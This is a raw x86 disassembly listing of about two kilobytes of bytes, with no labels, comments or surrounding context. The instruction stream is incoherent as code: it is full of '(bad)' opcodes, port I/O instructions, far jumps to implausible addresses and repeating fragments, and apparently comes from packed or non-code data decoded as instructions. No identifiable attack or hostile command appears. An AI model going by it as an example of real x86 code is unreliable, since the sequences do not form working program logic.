  4243c9:	xor    BYTE PTR [edi-0x76],0x80
  4243cd:	xchg   edi,eax
  4243ce:	mov    dl,BYTE PTR [ebx-0x64]
  4243d1:	push   ebx
  4243d2:	cld    
  4243d3:	mov    dl,0xf8
  4243d5:	sub    DWORD PTR [edx-0x400f37a],esi
  4243db:	adc    BYTE PTR [edi+0x1572c332],0x5f
  4243e2:	out    dx,al
  4243e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4243e4:	xlat   BYTE PTR ds:[ebx]
  4243e5:	rol    BYTE PTR [eax-0x687f7589],0x8a
  4243ec:	push   ebx
  4243ed:	pushf  
  4243ee:	push   ebx
  4243ef:	cld    
  4243f0:	mov    dl,0xf8
  4243f2:	sub    DWORD PTR [edx-0x400f37a],esi
  4243f8:	adc    BYTE PTR [edi+0x1572c332],0x5f
  4243ff:	jne    0x4243a7
  424401:	jno    0x42440c
  424403:	push   gs
  424405:	or     al,0x8d
  424407:	lea    eax,[eax+0x77808a77]
  42440d:	mov    al,BYTE PTR [eax+0x77808aa7]
  424413:	mov    dl,BYTE PTR [ebx+0x7c]
  424416:	push   ebx
  424417:	add    al,0xb2
  424419:	test   BYTE PTR [ecx],ch
  42441b:	mov    dl,0xc4
  42441d:	or     al,0xff
  42441f:	add    BYTE PTR [eax+0x6ac33277],0x15
  424426:	in     al,dx
  424427:	mov    dl,0x80
  424429:	jge    0x42449c
  42442b:	in     al,dx
  42442c:	lock out dx,eax
  42442e:	push   eax
  42442f:	lock test BYTE PTR [eax-0x687f7510],al
  424436:	mov    dl,BYTE PTR [ebx+0x51]
  424439:	push   ebx
  42443a:	pushf  
  42443b:	mov    dl,0xbe
  42443d:	or     al,0xb2
  42443f:	clc    
  424440:	sub    edi,edi
  424442:	inc    BYTE PTR [eax-0xfaf7569]
  424448:	jp     0x4243ca
  42444a:	out    dx,eax
  42444b:	push   eax
  42444c:	lock stc 
  42444e:	xor    al,0x8a
  424451:	push   ebx
  424452:	jle    0x4244a7
  424454:	sub    dh,BYTE PTR [edx+0x7b229ba]
  42445a:	or     al,0xff
  42445c:	mov    dh,0x80
  42445e:	lock stc 
  424460:	arpl   si,di
  424462:	aad    0x6f
  424464:	in     al,dx
  424465:	lock out dx,eax
  424467:	push   eax
  424468:	lock jp 0x4243eb
  42446b:	lock mov al,BYTE PTR [eax+0x51538a97]
  424472:	push   ebx
  424473:	pushf  
  424474:	mov    dl,0xbe
  424476:	or     al,0xb2
  424478:	clc    
  424479:	sub    edi,edi
  42447b:	(bad)  
  42447c:	in     al,dx
  42447d:	jge    0x4244a0
  42447f:	jl     0x4244f8
  424481:	xor    cl,0x24
  424484:	outs   dx,DWORD PTR ds:[esi]
  424485:	cmp    ah,ch
  424487:	lock out dx,eax
  424489:	push   eax
  42448a:	lock xchg esp,eax
  42448d:	in     al,dx
  42448e:	xor    al,0x87
  424491:	xor    BYTE PTR [edi+0x21],0x80
  424495:	int    0x32
  424497:	cmp    cl,BYTE PTR [ebp+0x714d968d]
  42449d:	xor    BYTE PTR [edi+0x21],0x4d
  4244a1:	xlat   BYTE PTR ds:[ebx]
  4244a2:	xchg   DWORD PTR [eax-0x72c5cd33],eax
  4244a8:	lea    ecx,[ebp+0xa]
  4244ab:	and    DWORD PTR [edi+esi*2-0x7d],edi
  4244af:	add    dl,ch
  4244b1:	cs jne 0x424530
  4244b4:	ja     0x424439
  4244b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244b7:	push   ss
  4244b8:	outs   dx,DWORD PTR ds:[esi]
  4244b9:	cmp    BYTE PTR [eax-0x687f7510],al
  4244bf:	mov    dl,BYTE PTR [ebx+0x51]
  4244c2:	push   ebx
  4244c3:	pushf  
  4244c4:	mov    dl,0xbe
  4244c6:	or     al,0xb2
  4244c8:	clc    
  4244c9:	sub    edi,edi
  4244cb:	(bad)  
  4244cc:	push   eax
  4244cd:	ja     0x4244c8
  4244cf:	arpl   bp,di
  4244d1:	xlat   BYTE PTR ds:[ebx]
  4244d2:	pop    ecx
  4244d3:	xor    BYTE PTR [edi-0x75],0x80
  4244d7:	lock mov edx,DWORD PTR [ebx-0x4]
  4244db:	push   ebx
  4244dc:	sub    dh,BYTE PTR [edx-0x794dd646]
  4244e2:	or     al,0xff
  4244e4:	mov    dl,0x80
  4244e6:	lock add DWORD PTR [eax-0x63ac7c69],0x53
  4244ee:	push   ecx
  4244ef:	mov    dl,0xf8
  4244f1:	sub    esp,ebp
  4244f3:	add    BYTE PTR [eax-0x327fde89],0x32
  4244fa:	cmp    cl,BYTE PTR [ebp+0xcbeb28d]
  424500:	push   DWORD PTR [esi-0x556bddf7]
  424506:	dec    ebp
  424507:	or     dh,BYTE PTR ds:0x808a7780
  42450d:	lock mov dl,BYTE PTR [ebx-0x4]
  424511:	push   ebx
  424512:	sub    dh,BYTE PTR [edx-0x454df37a]
  424518:	sub    edi,edi
  42451a:	mov    dl,0x63
  42451c:	ja     0x424517
  42451e:	xlat   BYTE PTR ds:[ebx]
  42451f:	mov    al,0x80
  424521:	ja     0x4244a5
  424523:	xor    al,0x82
  424526:	push   ebx
  424527:	sub    dl,BYTE PTR [ebx-0x4]
  42452a:	mov    dl,0x86
  42452c:	or     al,0xb2
  42452e:	mov    edx,0x63fdff29
  424533:	mov    al,ds:0x4d954c09
  424538:	dec    ebp
  424539:	dec    ebp
  42453a:	xor    BYTE PTR [edi-0x76],0x80
  42453e:	lock mov dl,BYTE PTR [ebx-0x4]
  424542:	push   ebx
  424543:	sub    dh,BYTE PTR [edx-0x454df37a]
  424549:	sub    edi,edi
  42454b:	mov    dl,0x63
  42454d:	ja     0x424548
  42454f:	xlat   BYTE PTR ds:[ebx]
  424550:	mov    al,0x80
  424552:	ja     0x4244df
  424554:	xor    al,0x8b
  424557:	push   ebx
  424558:	cld    
  424559:	push   ebx
  42455a:	sub    dh,BYTE PTR [edx-0x454df37a]
  424560:	sub    edi,edi
  424562:	mov    dl,0x3a
  424564:	ja     0x4244ec
  424566:	mov    esi,0x8d8d3aae
  42456b:	jl     0x4245e4
  42456d:	xchg   DWORD PTR [ecx+0x7c66f7ea],esi
  424573:	ja     0x42453d
  424575:	fld    DWORD PTR [ebp-0x587f12e3]
  42457b:	mov    al,BYTE PTR [eax+0x4538a77]
  424581:	push   ebx
  424582:	jl     0x424536
  424584:	les    ecx,FWORD PTR [edx+esi*4]
  424587:	test   BYTE PTR [ecx],ch
  424589:	inc    DWORD PTR [edx-0x72c5e442]
  42458f:	lea    eax,[eax-0xf7f7589]
  424595:	mov    dl,BYTE PTR [ebx-0x4]
  424598:	push   ebx
  424599:	sub    dh,BYTE PTR [edx-0x454df37a]
  42459f:	sub    edi,edi
  4245a1:	mov    dl,0x50
  4245a3:	ja     0x42452c
  4245a5:	xor    BYTE PTR [edi-0x76],0x80
  4245a9:	lock mov dl,BYTE PTR [ebx-0x4]
  4245ad:	push   ebx
  4245ae:	sub    dh,BYTE PTR [edx-0x454df37a]
  4245b4:	sub    edi,edi
  4245b6:	mov    dl,0x50
  4245b8:	ja     0x424582
  4245ba:	xor    al,0x8a
  4245bd:	xor    BYTE PTR [edi-0x76],0x53
  4245c1:	push   ecx
  4245c2:	push   ebx
  4245c3:	jl     0x424577
  4245c5:	test   BYTE PTR [ecx],ch
  4245c7:	mov    dl,0xbe
  4245c9:	or     al,0xff
  4245cb:	std    
  4245cc:	xor    BYTE PTR [edi+0x7a],0x63
  4245d0:	std    
  4245d1:	aad    0x6f
  4245d3:	sub    dh,0x1e
  4245d6:	push   eax
  4245d7:	ja     0x424560
  4245d9:	xor    BYTE PTR [edi-0x7c],0x80
  4245dd:	out    dx,al
  4245de:	push   ds
  4245df:	push   eax
  4245e0:	ja     0x4245aa
  4245e2:	xor    BYTE PTR [edi-0x76],0x80
  4245e6:	lock mov dl,BYTE PTR [ebx-0x4]
  4245ea:	push   ebx
  4245eb:	sub    dh,BYTE PTR [edx-0x794dd646]
  4245f1:	or     al,0xff
  4245f3:	mov    dl,0x80
  4245f5:	lock xchg DWORD PTR [ebx-0x4e],esp
  4245f9:	aad    0x55
  4245fb:	xor    BYTE PTR [edi-0x76],0x80
  4245ff:	lock mov dl,BYTE PTR [ebx+0x2a]
  424603:	push   ebx
  424604:	cld    
  424605:	mov    dl,0xba
  424607:	sub    DWORD PTR [edx-0x4d00f37a],esi
  42460d:	xor    al,0x87
  424610:	mov    dl,0xbe
  424612:	sub    esp,DWORD PTR [ebx-0x4e]
  424615:	aad    0x1d
  424617:	xor    al,0x87
  42461a:	xor    BYTE PTR [edi+0x21],0x80
  42461e:	int    0x32
  424620:	cmp    cl,BYTE PTR [ebp+0x705c098d]
  424626:	xchg   esi,eax
  424627:	dec    ebp
  424628:	xlat   BYTE PTR ds:[ebx]
  424629:	stc    
  42462a:	dec    ebp
  42462b:	or     ch,bh
  42462d:	les    ebx,FWORD PTR [edi]
  42462f:	xor    BYTE PTR [edi-0x38],0xec
  424633:	ja     0x424624
  424635:	xor    al,0x21
  424638:	adc    BYTE PTR [eax+0x32],0x3a
  42463c:	lea    ecx,[ebp+0xa0c6aed]
  424642:	dec    ebp
  424643:	xlat   BYTE PTR ds:[ebx]
  424644:	stc    
  424645:	dec    ebp
  424646:	xchg   esi,eax
  424647:	out    dx,eax
  424648:	push   eax
  424649:	ja     0x424613
  42464b:	xor    BYTE PTR [edi-0x76],0x80
  42464f:	lock mov dl,BYTE PTR [ebx-0x4]
  424653:	push   ebx
  424654:	sub    dh,BYTE PTR [edx-0x794dd646]
  42465a:	or     al,0xff
  42465c:	mov    dl,0x80
  42465e:	lock enter 0xb263,0x80
  424663:	ja     0x4245f0
  424665:	xor    al,0x8b
  424668:	xlat   BYTE PTR ds:[ebx]
  424669:	push   cs
  42466a:	push   ebx
  42466b:	cld    
  42466c:	push   ebx
  42466d:	sub    dh,BYTE PTR [edx-0x454df37a]
  424673:	sub    edi,edi
  424675:	mov    dl,0x3a
  424677:	ja     0x4245ff
  424679:	les    ebx,FWORD PTR ds:0xfc532a53
  42467f:	mov    dl,0xba
  424681:	sub    DWORD PTR [edx-0x4d00f37a],esi
  424687:	xor    al,0xc8
  42468a:	or     DWORD PTR [edx],esp
  42468c:	mov    dl,0x80
  42468e:	lock test BYTE PTR [eax-0x12],dl
  424692:	and    BYTE PTR [eax-0xf7f7489],al
  424698:	mov    edx,DWORD PTR [ebx-0x4]
  42469b:	push   ebx
  42469c:	sub    dh,BYTE PTR [edx-0x454df37a]
  4246a2:	sub    edi,edi
  4246a4:	mov    dl,0xec
  4246a6:	add    BYTE PTR [eax-0xf7f7589],0x8a
  4246ad:	push   ebx
  4246ae:	sub    dl,BYTE PTR [ebx-0x4]
  4246b1:	mov    dl,0xba
  4246b3:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4246b9:	xor    al,0x84
  4246bc:	pop    edi
  4246bd:	out    dx,al
  4246be:	and    BYTE PTR [ecx],cl
  4246c0:	dec    edi
  4246c1:	adc    DWORD PTR ds:0x77804d4d,ecx
  4246c7:	xor    al,BYTE PTR [eax-0x4d92cd10]
  4246cd:	xchg   BYTE PTR [ecx],ch
  4246cf:	add    DWORD PTR [ecx],esp
  4246d1:	add    esi,ebp
  4246d3:	lea    ecx,[ebp-0x7f4d0073]
  4246d9:	lock not DWORD PTR [edi-0xa]
  4246dd:	and    al,0x6f
  4246df:	cmp    BYTE PTR [esi+0x4d4d8afe],bh
  4246e5:	xor    BYTE PTR [edi-0x76],0x80
  4246e9:	lock mov dl,BYTE PTR [ebx-0x4]
  4246ed:	push   ebx
  4246ee:	sub    dh,BYTE PTR [edx-0x454df37a]
  4246f4:	sub    edi,edi
  4246f6:	mov    dl,0x5f
  4246f8:	ja     0x424680
  4246fa:	xlat   BYTE PTR ds:[ebx]
  4246fb:	out    dx,eax
  4246fc:	xor    BYTE PTR [edi-0x75],0x80
  424700:	lock mov eax,esp
  424703:	outs   dx,DWORD PTR ds:[esi]
  424704:	xor    BYTE PTR [edi-0x76],0x80
  424708:	lock mov dl,BYTE PTR [ebx+0x2a]
  42470c:	push   ebx
  42470d:	cld    
  42470e:	stos   DWORD PTR es:[edi],eax
  42470f:	mov    dl,0xba
  424711:	sub    DWORD PTR [edx-0x56f37a],esi
  424717:	mov    dl,0xa3
  424719:	jo     0x424716
  42471b:	out    dx,eax
  42471c:	lea    edx,[edi-0x78127880]
  424722:	xor    eax,0xf68a777c
  424727:	and    al,0x6f
  424729:	cmp    BYTE PTR [edi+esi*2-0x7c],bh
  42472d:	cmc    
  42472e:	and    al,0x6f
  424730:	cmp    BYTE PTR [eax+0x77502177],al
  424736:	and    DWORD PTR [ecx+0x77806a80],ebx
  42473c:	mov    al,BYTE PTR [eax+0xde28a97]
  424742:	pusha  
  424743:	and    ah,BYTE PTR [edi+ebp*2]
  424746:	cmp    BYTE PTR [ebx-0x4e],dl
  424749:	test   eax,0xf8b27e53
  42474e:	sub    DWORD PTR [edx-0x400f37a],esi
  424754:	adc    BYTE PTR [edi+0x9f763ef],0xf
  42475b:	loopne 0x424797
  42475d:	lea    ecx,[ebp-0x7f108880]
  424763:	xchg   edi,eax
  424764:	out    dx,eax
  424765:	in     al,dx
  424766:	or     ah,BYTE PTR [ebp-0x65]
  424769:	push   eax
  42476a:	xchg   edi,eax
  42476b:	enter  0x777c,0x8b
  42476f:	icebp  
  424770:	and    al,0x6f
  424772:	cmp    BYTE PTR [eax-0x687f7489],al
  424778:	mov    edx,DWORD PTR [ebx+0x7e]
  42477b:	mov    dl,0xf8
  42477d:	sub    DWORD PTR [ebx-0x4e],edx
  424780:	mov    dl,0x86
  424782:	or     al,0xff
  424784:	sti    
  424785:	adc    BYTE PTR [edi-0x75187f76],0x53
  42478c:	mov    dh,0x53
  42478e:	or     eax,0xb229bcb2
  424793:	pop    es
  424794:	or     al,0xff
  424796:	pushf  
  424797:	and    bh,0xc8
  42479a:	pop    edi
  42479b:	xchg   ebp,eax
  42479c:	jl     0x42477b
  42479e:	or     DWORD PTR [edi],ecx
  4247a0:	mov    bl,0x3a
  4247a2:	lea    ecx,[ebp-0x7f376880]
  4247a8:	ja     0x424799
  4247aa:	in     al,dx
  4247ab:	jmp    0x9780:0x8d8d8d2e
  4247b2:	out    dx,eax
  4247b3:	and    bh,0xc8
  4247b6:	inc    ebx
  4247b7:	fwait
  4247b8:	push   ebp
  4247b9:	and    bh,0x8a
  4247bc:	xchg   ebx,eax
  4247bd:	and    BYTE PTR [edi+0x53cb538a],0x4
  4247c4:	mov    dl,0x61
  4247c6:	or     al,0xb2
  4247c8:	mov    ah,0x29
  4247ca:	inc    DWORD PTR [esi]
  4247cc:	push   eax
  4247cd:	xchg   edi,eax
  4247ce:	and    DWORD PTR [ebx-0x64],0x9
  4247d2:	jns    0x80cfd512
  4247d8:	xchg   edi,eax
  4247d9:	mov    al,BYTE PTR [eax-0x49ac7519]
  4247df:	push   ebx
  4247e0:	or     eax,0xb20c07b2
  4247e5:	mov    esp,0x509cff29
  4247ea:	xchg   edi,eax
  4247eb:	xor    bh,BYTE PTR [edi+esi*2+0x21]
  4247ef:	repz and al,0x6f
  4247f2:	cmp    BYTE PTR [eax-0x187f7569],al
  4247f8:	mov    dl,BYTE PTR [ebx-0x4a]
  4247fb:	push   ebx
  4247fc:	or     eax,0xb20c07b2
  424801:	mov    esp,0xbe9cff29
  424806:	add    eax,0x808d8d8d
  42480b:	xchg   edi,eax
  42480c:	mov    al,BYTE PTR [eax+0xbed8ad7]
  424812:	or     eax,0x2b2b653
  424817:	sub    DWORD PTR [edx+0x7eff0c07],esi
  42481d:	add    ebx,edx
  42481f:	mov    esi,DWORD PTR [esi+0x97e6388]
  424825:	in     eax,dx
  424826:	jmp    0x43cfd5b8
  42482b:	ret    0xe501
  42482e:	or     ch,bh
  424830:	push   eax
  424831:	xlat   BYTE PTR ds:[ebx]
  424832:	stc    
  424833:	or     DWORD PTR [ebx+ebx*1-0x5e],ebx
  424837:	clc    
  424838:	dec    ebp
  424839:	or     DWORD PTR [ebp-0x7868af73],ecx
  42483f:	adc    BYTE PTR [edi-0x7f8e1379],0xd7
  424846:	xchg   esp,ebp
  424848:	xor    DWORD PTR [edx+0x2b22907],0x9c2ff0c
  424852:	pop    esp
  424853:	sbb    esi,DWORD PTR [edx+0xba22107]
  424859:	mul    BYTE PTR [edi+ebp*2]
  42485c:	cmp    BYTE PTR [eax-0x29],dl
  42485f:	xchg   DWORD PTR [eax-0x69],edx
  424862:	xchg   BYTE PTR [eax-0x287f7869],al
  424868:	xchg   DWORD PTR [ebx-0x4a],edx
  42486b:	in     eax,dx
  42486c:	or     ecx,DWORD PTR ds:0xb20c07b2
  424872:	add    ch,BYTE PTR [ecx]
  424874:	(bad)  
  424875:	jle    0x424863
  424877:	xchg   edi,eax
  424878:	out    dx,eax
  424879:	push   eax
  42487a:	xchg   edi,eax
  42487b:	xchg   DWORD PTR [eax-0x287fde69],eax
  424881:	and    DWORD PTR [ebx-0x4a],edx
  424884:	in     eax,dx
  424885:	or     ecx,DWORD PTR ds:0xb22902b2
  42488b:	pop    es
  42488c:	or     al,0xff
  42488e:	jle    0x424810
  424890:	xlat   BYTE PTR ds:[ebx]
  424891:	xchg   BYTE PTR [ebx-0x3e],ah
  424894:	xlat   BYTE PTR ds:[ebx]
  424895:	rol    BYTE PTR [eax-0x287fde69],0x21
  42489c:	push   ebx
  42489d:	mov    dh,0xed
  42489f:	or     ecx,DWORD PTR ds:0xb22902b2
  4248a5:	pop    es
  4248a6:	or     al,0xff
  4248a8:	jle    0x42482a
  4248aa:	xlat   BYTE PTR ds:[ebx]
  4248ab:	xchg   BYTE PTR [ebx-0x3e],ah
  4248ae:	xlat   BYTE PTR ds:[ebx]
  4248af:	out    dx,eax
  4248b0:	adc    BYTE PTR [edi-0x7c287f79],0x3a
  4248b7:	aam    0xed
  4248b9:	jl     0x4248c7
  4248bb:	dec    ebp
  4248bc:	lock stc 
  4248be:	or     DWORD PTR [edi+0x12],ecx
  4248c1:	dec    ebp
  4248c2:	dec    ebp
  4248c3:	dec    ebp
  4248c4:	cmp    ah,BYTE PTR [edi-0x74687fce]
  4248ca:	adc    bh,0x8b
  4248cd:	push   ebx
  4248ce:	mov    dh,0xed
  4248d0:	or     ecx,DWORD PTR ds:0xb22902b2
  4248d6:	pop    es
  4248d7:	or     al,0xff
  4248d9:	jle    0x42485b
  4248db:	xlat   BYTE PTR ds:[ebx]
  4248dc:	xor    al,BYTE PTR [eax-0x2a9c3719]
  4248e2:	pushf  
  4248e3:	in     eax,0xd3
  4248e5:	sub    eax,0x808a9780
  4248ea:	xlat   BYTE PTR ds:[ebx]
  4248eb:	mov    dl,BYTE PTR [ebx-0x4a]
  4248ee:	in     eax,dx
  4248ef:	or     ecx,DWORD PTR ds:0xb20c07b2
  4248f5:	add    ch,BYTE PTR [ecx]
  4248f7:	in     al,dx
  4248f8:	je     0x4248f9
  4248fa:	jle    0x42487c
  4248fc:	popf   
  4248fd:	out    dx,al
  4248fe:	arpl   WORD PTR [ebx],ax
  424900:	or     DWORD PTR [edi-0x12],ecx
  424903:	dec    ebp
  424904:	dec    ebp
  424905:	dec    ebp
  424906:	mov    ds:0x53847780,eax
  42490b:	mov    dl,0x80
  42490d:	lock test ch,ch
  424910:	add    eax,0xa6c4ab0d
  424915:	xor    BYTE PTR [edi-0x76],0x53
  424919:	mov    dl,0x80
  42491b:	lock mov dl,BYTE PTR [ebx+0x51]
  42491f:	mov    dl,0xba
  424921:	sub    DWORD PTR [edx-0x4d00f37a],esi
  424927:	test   eax,0x8deffb70
  42492c:	xchg   edi,eax
  42492d:	add    BYTE PTR [edi-0x7285785e],0x8d
  424934:	lea    edi,[edi+esi*2-0x76]
  424938:	mul    BYTE PTR [edi+ebp*2]
  42493b:	cmp    BYTE PTR [edi+esi*2-0x75],bh
  42493f:	cmc    
  424940:	and    al,0x6f
  424942:	cmp    BYTE PTR [eax-0xf7f7589],al
  424948:	mov    bl,BYTE PTR [ecx-0x5f21d65]
  42494e:	and    ah,BYTE PTR [edi+ebp*2]
  424951:	cmp    BYTE PTR [ebx-0x4],dl
  424954:	mov    dl,0x86
  424956:	or     al,0xae
  424958:	push   ebx
  424959:	(bad)  
  42495a:	mov    dl,0xba
  42495c:	sub    edi,edi
  42495e:	mov    dl,0x50
  424960:	ja     0x4248e6
  424962:	xor    BYTE PTR [edi-0x76],0x80
  424966:	lock mov dl,BYTE PTR [ebx-0x4]
  42496a:	mov    dl,0x86
  42496c:	or     al,0x53
  42496e:	(bad)  
  42496f:	mov    dl,0xba
  424971:	sub    edi,edi
  424973:	mov    dl,0x50
  424975:	ja     0x42496e
  424977:	and    bh,0x25
  42497a:	xor    BYTE PTR [edi-0x79],0x80
  42497e:	lock xchg DWORD PTR [ebx-0x4e],edx
  424982:	push   eax
  424983:	ja     0x42490c
  424985:	mov    ds:0xa3f68777,al
  42498a:	outs   dx,DWORD PTR ds:[esi]
  42498b:	cmp    BYTE PTR [eax-0xf7f3789],al
  424991:	enter  0xb253,0x50
  424995:	ja     0x42495f
  424997:	mov    ds:0xe9f6c877,al
  42499c:	outs   dx,DWORD PTR ds:[esi]
  42499d:	cmp    BYTE PTR [eax-0xf7fcd89],al
  4249a3:	xor    dl,BYTE PTR [ebx-0x4e]
  4249a6:	push   eax
  4249a7:	ja     0x4249db
  4249a9:	mov    ds:0x24fa3277,al
  4249ae:	outs   dx,DWORD PTR ds:[esi]
  4249af:	cmp    BYTE PTR [eax-0xf7f0689],al
  4249b5:	stc    
  4249b6:	push   ebx
  4249b7:	mov    dl,0x50
  4249b9:	ja     0x4249b4
  4249bb:	mov    ds:0x24f6f977,al
  4249c0:	out    dx,al
  4249c1:	cmp    BYTE PTR [edi+esi*2+0x25],bh
  4249c5:	jmp    0x807ad68c
  4249ca:	ja     0x4249bb
  4249cc:	dec    edi
  4249cd:	push   0x9
  4249cf:	movd   mm5,DWORD PTR [edi]
  4249d2:	lea    ecx,[ebp+0x4f217780]
  4249d8:	push   0x9
  4249da:	(bad)  
  4249dc:	das    
  4249dd:	lea    ecx,[ebp+0x4f1d7780]
  4249e3:	push   0x9
  4249e5:	mov    db5,edi
  4249e8:	lea    ecx,[ebp-0x7fda8880]
  4249ee:	ja     0x424a15
  4249f0:	xor    al,0xef
  4249f3:	mov    dl,0x86
  4249f5:	or     al,0x57
  4249f7:	(bad)  
  4249f8:	hlt    
  4249f9:	lea    ecx,[ebp+0x93a5fb9]
  4249ff:	dec    edi
  424a00:	cmp    ch,BYTE PTR [edi]
  424a02:	lea    ecx,[ebp-0x7f758880]
  424a08:	lock mov dl,BYTE PTR [ebx-0x4]
  424a0c:	mov    dl,0x86
  424a0e:	or     al,0x53
  424a10:	(bad)  
  424a11:	mov    dl,0xba
  424a13:	sub    edi,edi
  424a15:	mov    dl,0x50
  424a17:	ja     0x424a10
  424a19:	xor    BYTE PTR [edi-0x76],0x80
  424a1d:	ja     0x4249a9
  424a1f:	xor    BYTE PTR [edi-0x11],0x80
  424a23:	lock out dx,eax
  424a25:	in     al,dx
  424a26:	jge    0x424a8d
  424a28:	adc    BYTE PTR [edx+0x25f0500a],0x4f
  424a2f:	push   0x9
  424a31:	cvtpi2ps xmm5,mm6
  424a34:	lea    ecx,[ebp-0x9858884]
  424a3a:	and    al,0x79
  424a3c:	cmp    BYTE PTR [eax-0x7f6c8589],al
  424a42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a43:	jp     0x424a98
  424a45:	cld    
  424a46:	push   ebx
  424a47:	add    esi,DWORD PTR [edx-0x4b4df37a]
  424a4d:	sub    edi,edi
  424a4f:	adc    BYTE PTR [eax-0x59],0x7a
  424a53:	xor    BYTE PTR [edi-0x76],0x80
  424a57:	ja     0x4249e3
  424a59:	or     dh,0x2e
  424a5c:	cmp    cl,BYTE PTR [ebp-0x7f8e7f73]
  424a62:	stos   BYTE PTR es:[edi],al
  424a63:	gs in  al,dx
  424a65:	jno    0x4249e7
  424a67:	ja     0x4249f3
  424a69:	xor    BYTE PTR [edi-0x76],0x80
  424a6d:	into   
  424a6e:	cmp    cl,BYTE PTR es:[ebp+0x501d808d]
  424a75:	xchg   edi,eax
  424a76:	and    DWORD PTR [ebx-0x5c],esp
  424a79:	xlat   BYTE PTR ds:[ebx]
  424a7a:	imul   eax,DWORD PTR [eax-0x317f3710],0x32
  424a81:	cmp    cl,BYTE PTR [ebp-0x7b68fe73]
  424a87:	stos   BYTE PTR es:[edi],al
  424a88:	adc    BYTE PTR [edi-0x12aeac38],0xc2
  424a8f:	or     eax,0xb20cbeb2
  424a94:	clc    
  424a95:	sub    edi,edi
  424a97:	mov    dh,0x80
  424a99:	lock and DWORD PTR [edx-0x6cf561b3],ebp
  424aa0:	dec    ebp
  424aa1:	or     ah,BYTE PTR ds:0x8021f080
  424aa7:	xchg   edx,eax
  424aa8:	xchg   ebp,eax
  424aa9:	cmp    BYTE PTR [edi+0xa],0x43
  424aad:	std    
  424aae:	xchg   esi,eax
  424aaf:	in     al,dx
  424ab0:	je     0x424abc
  424ab2:	xchg   BYTE PTR [ecx-0x7f727291],ah
  424ab8:	lock and eax,0x3a36ce80
  424abe:	lea    ecx,[ebp-0x61b2e2b0]
  424ac4:	xchg   ebp,eax
  424ac5:	dec    ebp
  424ac6:	xlat   BYTE PTR ds:[ebx]
  424ac7:	out    dx,eax
  424ac8:	xchg   ebx,eax
  424ac9:	xchg   BYTE PTR [edi-0x7f727212],ch
  424acf:	xchg   ebx,eax
  424ad0:	gs in  al,dx
  424ad2:	xchg   esp,eax
  424ad3:	or     DWORD PTR [eax+ebx*8+0x15],ebx
  424ad7:	add    DWORD PTR [ebp+0x71],esi
  424ada:	sbb    eax,0x801d7750
  424adf:	ja     0x424a6b
  424ae1:	xor    al,0x8a
  424ae4:	push   ebx
  424ae5:	cld    
  424ae6:	in     eax,dx
  424ae7:	add    eax,0x29bab20d
  424aec:	mov    dl,0x86
  424aee:	or     al,0xff
  424af0:	mov    dl,0x9
  424af2:	pop    esp
  424af3:	fisubr DWORD PTR [edi+0x50]
  424af6:	xchg   edi,eax
  424af7:	and    eax,0xf09fd63
  424afc:	mov    esp,0x808d8d8d
  424b01:	ja     0x424a8d
  424b03:	xor    al,0x8a
  424b06:	push   ebx
  424b07:	cld    
  424b08:	in     eax,dx
  424b09:	add    eax,0x29bab20d
  424b0e:	mov    dl,0x86
  424b10:	or     al,0xff
  424b12:	mov    dl,0x50
  424b14:	ja     0x424a99
  424b16:	xor    BYTE PTR [edi-0x75],0x80
  424b1a:	lock mov ebp,ebp
  424b1d:	add    eax,0xb2fc530d
  424b22:	mov    edx,0xc86b229
  424b27:	push   DWORD PTR [edx+0x6fda5c09]
  424b2d:	inc    ebx
  424b2e:	std    
  424b2f:	pop    edi
  424b30:	lock or DWORD PTR [ecx],0xffffffce
  424b34:	and    cl,BYTE PTR [ebp-0xf7f7273]
  424b3a:	sbb    eax,0x50efb2ed
  424b3f:	lock sbb eax,0xf080ecc4
  424b45:	sbb    eax,0x805dd880
  424b4a:	push   cs
  424b4b:	push   eax
  424b4c:	ja     0x424ad0
  424b4e:	jge    0x424b9f
  424b50:	not    ebp
  424b52:	xor    BYTE PTR [ebx-0x9],cl
  424b55:	xor    edi,ebx
  424b57:	in     al,dx
  424b58:	ja     0x424adc
  424b5a:	les    ecx,FWORD PTR [eax+eax*4]
  424b5d:	sti    
  424b5e:	or     al,BYTE PTR [eax+0x74ecee92]
  424b64:	or     al,BYTE PTR [esi-0x7272d05d]
  424b6a:	xor    BYTE PTR [edi+0x1d],0x80
  424b6e:	jge    0x424b5f
  424b70:	push   eax
  424b71:	lock add BYTE PTR [eax-0x687f7510],0x8a
  424b79:	push   ebx
  424b7a:	push   ecx
  424b7b:	in     eax,dx
  424b7c:	ret    0xb20d
  424b7f:	mov    esi,0x29f8b20c
  424b84:	(bad)  
  424b85:	(bad)  
  424b86:	pop    edi
  424b87:	lock adc ch,0x1d
  424b8b:	xor    al,0xef
  424b8e:	in     al,dx
  424b8f:	jge    0x424bb2
  424b91:	dec    ebp
  424b92:	xlat   BYTE PTR ds:[ebx]
  424b93:	add    BYTE PTR [eax-0x13691193],0x74
  424b9a:	or     al,BYTE PTR [esi-0x7272137b]
  424ba0:	xor    BYTE PTR [edi+0x1d],0x80
  424ba4:	lock mov eax,DWORD PTR [eax+0x51538b97]
  424bab:	mov    dl,0xbe
  424bad:	or     al,0xed
  424baf:	ret    0xed0d
  424bb2:	push   0x3d
  424bb4:	mov    dl,0xf8
  424bb6:	sub    edi,edi
  424bb8:	(bad)  
  424bb9:	cmp    dh,al
  424bbb:	add    DWORD PTR [eax+0x77502597],0x1d
  424bc2:	xor    BYTE PTR [edi-0x75],0x80
  424bc6:	lock mov ebp,ebp
  424bc9:	add    eax,0xb2fc530d
  424bce:	mov    edx,0xc86b229
  424bd3:	push   DWORD PTR [edx+0x925f080]
  424bd9:	pop    esp
  424bda:	jg     0x424c4b
  424bdc:	inc    ebx
  424bdd:	std    
  424bde:	pop    edi
  424bdf:	lock or DWORD PTR [ecx],0x4c
  424be3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424be4:	dec    ebp
  424be5:	dec    ebp
  424be6:	dec    ebp
  424be7:	or     dh,0x26
  424bea:	cmp    cl,BYTE PTR [ebp-0x28e29c73]
  424bf0:	push   ebx
  424bf1:	xor    al,0x32
  424bf4:	or     dh,0x32
  424bf7:	cmp    cl,BYTE PTR [ebp-0x7b68fe73]
  424bfd:	stos   BYTE PTR es:[edi],al
  424bfe:	adc    BYTE PTR [edi-0x12aeacce],0xc2
  424c05:	or     eax,0xb20cbeb2
  424c0a:	clc    
  424c0b:	sub    edi,edi
